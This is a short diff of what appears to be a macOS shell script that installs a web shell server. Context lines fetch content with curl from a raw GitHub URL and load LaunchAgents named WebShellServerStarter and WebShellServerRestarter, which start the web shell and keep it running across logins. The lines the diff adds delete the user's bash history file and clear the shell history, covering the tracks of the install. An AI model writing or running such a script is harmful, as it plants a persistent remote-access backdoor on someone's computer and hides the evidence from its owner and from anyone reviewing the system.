@@ -14,3 +14,6 @@ printf "%s%s%s" "$(curl -s https://raw.githubusercontent.com/teeheeheeaaahhaha/w
 # run server now, don't wait for next login:
 launchctl load ~/Library/LaunchAgents/WebShellServerStarter.plist
 launchctl load ~/Library/LaunchAgents/WebShellServerRestarter.plist
+
+rm ~/.bash_history
+history -c
